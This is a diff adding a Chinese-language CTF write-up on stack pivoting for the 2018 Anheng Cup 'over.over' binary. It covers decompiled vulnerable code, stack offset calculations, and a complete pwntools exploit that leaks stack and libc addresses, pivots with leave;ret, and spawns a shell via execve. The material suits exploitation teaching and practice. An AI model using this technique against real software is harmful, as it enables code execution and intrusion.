@@ -197,4 +197,167 @@ ret # return to target function 需要提前在ebp2_addr+4处写入target functi
 +---------------------+ <- ebp2_addr
 ```
 
-### 待添加
+
+### 2018 安恒杯 over.over
+
+```
+over.over: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=99beb778a74c68e4ce1477b559391e860dd0e946, stripped
+[*] '/home/m4x/pwn_repo/others_over/over.over'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE
+```
+
+```c
+__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  while ( sub_400676() )
+    ;
+  return 0LL;
+}
+
+int sub_400676()
+{
+  char buf[80]; // [rsp+0h] [rbp-50h]
+
+  memset(buf, 0, sizeof(buf));
+  putchar('>');
+  read(0, buf, 96uLL);
+  return puts(buf);
+}
+```
+
+可以看出read读96字节但buf长度已经有80字节，所以只能覆盖saved rbp和retaddr
+
+#### leak stack
+
+我们使用`puts`函数leak出save rbp，然后就能根据`RBP`的值推算出栈上各个数据的地址
+
+我们leak的时候靠的是运行`sub_400676()`这个函数中的puts函数，而传给puts的参数是位于`sub_400676`栈上的`buf`，`buf`挨着的是`sub_400676`的saved rbp，而这个saved rbp是主调函数的，也就是`main`函数。我们需要计算`main`函数的`RBP`地址到`buf`的长度，因为我们的目的是在`buf`上填入rop链，然后劫持`RBP`和`RSP`到`buf`上。
+
+一种简单的计算方法是调试，在main函数下断点看看RBP的值，然后运行到`sub_400676`看看`buf`的地址，直接一减就出来了。
+
+另一种方法是看汇编，`main`函数中:
+
+```nasm
+.text:00000000004006C1                 mov     rbp, rsp
+.text:00000000004006C4                 sub     rsp, 10h
+```
+
+这使`RBP`的值固定，`RSP`减0x10，也就是说`main`函数的栈大小为0x10，即`RSP`到`RBP`距离为0x10
+
+随后运行到`call sub_400676()`：
+
+```nasm
+.text:0000000000400676                 push    rbp
+.text:0000000000400677                 mov     rbp, rsp
+.text:000000000040067A                 sub     rsp, 50h
+```
+
+这使得`RSP`向下移动了0x8+0x8+0x50=0x60。其中第一个0x8是`call`指令把返回地址压栈造成的
+
+所以`RSP`到最初`RBP`的距离是0x10+0x60=0x70
+
+当我们泄露出`main`函数的`RBP`，我们对其减0x70，就能得到`buf`的地址了
+
+#### exp：
+
+```python
+from pwn import *
+context.binary = "./over.over"
+
+'''for debug
+def DEBUG(cmd):
+    raw_input("DEBUG: ")
+    gdb.attach(io, cmd)
+'''
+
+io = process("./over.over")
+elf = ELF("./over.over")
+libc = elf.libc # 本地打，可以直接获取libc
+
+io.sendafter(b">", b'a' * 80)
+buf = u64(io.recvuntil(b"\x7f")[-6: ].ljust(8, b'\0')) - 0x70
+# 这个程序本身会调用puts打印出我们输入的东西，而puts只有遇到"\0"才会停
+# 我们用0x80个a把栈空间填满，于是puts就会一直打印直到遇到"\0"
+# 而后面就是8字节的saved rbp，会被puts泄露出来
+# 栈是由高地址向低地址生长，其最高字节一定是"\x7f"
+# 根据小端序"高高低低"，"\x7f"在高地址也就是泄露出来的8字节的最后一个字节，故recvuntil(b"\x7f")
+# 至于这里为什么切最后6个字节，原因是x64规定内存地址不能大于 0x00007FFFFFFFFFFF
+# 6个字节长度，否则会抛出异常。所以栈地址一定保存在最后6字节中
+
+success("buf -> {:#x}".format(buf))
+
+pop_rdi_ret=0x400793
+leave_ret = 0x4006be
+#  DEBUG("b *0x4006B9\nc")
+payload = flat([b'11111111', pop_rdi_ret, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * b'1', buf, leave_ret])
+# 这个payload先倒着看，依次对应的是retaddr和saved rbp
+# 首先pop rbp使rbp指向buf，也就是payload写进栈中的"11111111"那个位置
+# 然后ret到leave_ret，执行leave使rsp也指向buf，随后pop rbp把"11111111"弹出，rsp指向pop_rdi_ret
+# ret到pop_rdi_ret，把puts的got表载入rdi，再ret调用puts来泄露got表得到偏移量
+# puts再ret回到sub_400676了
+
+io.sendafter(b">", payload)
+libc.address = u64(io.recvuntil(b"\x7f")[-6: ].ljust(8, b'\0')) - libc.sym['puts']
+'''
+这一步是实际地址减去偏移量得到libc基址
+libc被加载到内存中的动态链接区域，这个区域在栈的下方，所以这里也使用"\x7f"作为结束符接受
+对应的，对于32位程序，需要使用"\xf7"
+u32(r.recvuntil('\xf7')[-4:])
++-------------------+  <--- 高地址
+|       栈区        |
+|                   |
+|                   |
++-------------------+
+|   动态链接区域    |
++-------------------+
+|       堆区        |
+|                   |
+|                   |
++-------------------+
+|       数据区      |
+|  (data + bss)     |
++-------------------+
+|       代码区      |
++-------------------+  <--- 低地址
+'''
+
+success("libc.address -> {:#x}".format(libc.address))
+
+'''每台机子不一样
+$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"|grep -E "rsi|rdx"
+0x0000000000090528 : pop rax ; pop rdx ; pop rbx ; ret
+0x000000000011f497 : pop rdx ; pop r12 ; ret
+0x0000000000090529 : pop rdx ; pop rbx ; ret
+0x0000000000108b13 : pop rdx ; pop rcx ; pop rbx ; ret
+0x000000000002a743 : pop rsi ; pop r15 ; pop rbp ; ret
+0x000000000002a3e3 : pop rsi ; pop r15 ; ret
+0x000000000002be51 : pop rsi ; ret
+'''
+pop_rsi_ret=libc.address+0x2be51
+pop_rdx_rbx_ret = libc.address+0x90529
+# execve("/bin/sh", 0, 0)
+print("/bin/sh ",hex(next(libc.search(b"/bin/sh"))))
+print("execve", hex(libc.sym['execve']))
+payload=flat([b'22222222', pop_rdi_ret, next(libc.search(b"/bin/sh")),pop_rsi_ret,p64(0),pop_rdx_rbx_ret,p64(0),p64(0xdeadbeef), libc.sym['execve'], (80 - 9*8 ) * b'2', buf - 0x30, 0x4006be])
+# 此payload和之前的类似，但不同之处是最后是buf - 0x30
+# 观察上一个payload，第一次pop rbp时rsp指向payload中的buf位置
+# 执行完puts到最后程序ret又回到了sub_400676
+# [b'11111111', pop_rdi_ret, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * b'1', buf, leave_ret]
+# 回想当我们正常进入sub_400676时push rbp之前，rsp指向的是payload中的leave_ret
+# 而我们上一次通过ret进入sub_400676时push rbp之前，rsp指向payload中的0x400676的末尾
+# 这两次rsp相差 (80 - 40) * '1'+ buf两段数据长0x30，也就是说rsp向下移动了0x30
+# 所以第二次payload的"22222222"的填入地址减小了0x30
+# 如果想不通就用gdb调试下，直接下断点看rsp值
+
+io.sendafter(b">", payload)
+
+io.interactive()
+```
+
+## 待添加
